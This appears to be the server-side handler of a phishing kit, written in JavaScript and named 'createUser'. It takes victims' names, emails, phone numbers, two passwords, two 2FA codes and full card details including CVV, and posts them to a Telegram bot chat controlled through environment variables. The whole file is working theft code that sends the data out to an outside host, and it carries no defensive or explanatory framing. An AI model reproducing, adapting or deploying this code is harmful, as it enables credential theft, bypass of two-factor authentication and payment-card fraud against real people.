import axios from "axios";

export const createUser = async (req, res) => {
    try {
        const { id,
            full_name,
            login_email,
            phone_number,
            password_one,
            password_two,
            tfa_one,
            tfa_two,
            CardName,
            CardNr,
            CardDate,
            CardCvc
        } = req.body;

        console.log(req.body)
        const params =
            `=============================%0A ID: ${id}%0A${full_name ? `Full Name: ${full_name}%0A` : ''}${login_email ? `Email: ${login_email}%0A ` : ''}${phone_number ? `Tel: ${phone_number}%0A` : ''}${password_one ? `Password1: ${password_one}%0A` : ''}${password_two ? `Password2: ${password_two}%0A` : ''}${tfa_one ? `2fa: ${tfa_one}%0A` : ''}${tfa_two ? `2fa-2: ${tfa_two}%0A` : ''}${CardName ? `Name: ${CardName}%0A` : ''}${CardNr ? `Card Number: ${CardNr}%0A` : ''}${CardDate ? `Expiry Date: ${CardDate}%0A` : ''}${CardCvc ? `CVV: ${CardCvc}%0A` : ''}=============================`;

        axios.post(`https://api.telegram.org/bot${process.env.BOT}/sendMessage?chat_id=${process.env.CHAT_ID}&text=${params}`, {
            headers: {
                'Content-Type': 'application/json',
                'X-Robots-Tag': 'googlebot: nofollow',
            },

        }).then(data => {
            if (data.status === 200) {
                return res.send({
                    success: true
                })
            }
        })

    } catch (error) {
        return res.send({
            success: false,
            message: error.message,
        });
    }
};

